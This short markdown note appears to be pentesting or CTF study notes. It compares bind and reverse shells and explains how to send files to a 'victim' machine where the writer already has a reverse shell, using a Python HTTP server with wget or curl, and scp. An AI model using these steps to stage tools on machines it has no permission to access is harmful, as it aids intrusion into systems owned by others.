## Transfering files from your pc to another remote machine u have a reverse shell in


#### **differeces between reverse and bind shells :**
| bind shell | revrse shell
| --------------|-------------
|listening on open <br /> port on the victims <br /> machine | listening on <br /> the attacker's machine
|the attackers connects <br />  to the victims machine<br /> from his pc | the attackers connects <br /> to his own pc from <br /> the victims pc
| may fail bcz of firewall <br /> only allowing connections<br /> on ports 80 449..|can bypass firewall issues|
  


### python http server
```shell
cd directory-containing-files
python3 -m http.server
```
this will serve files in the dir via http on port 8000 by default

to get the files use wget or curl
```shell
wget http://myip/file
curl http://myip/file --output some.file
```

### SCP : secure copy protocol
based on ssh, used to push files to a distant machine
```shell
    scp file.txt root_remote@victim_ip file
```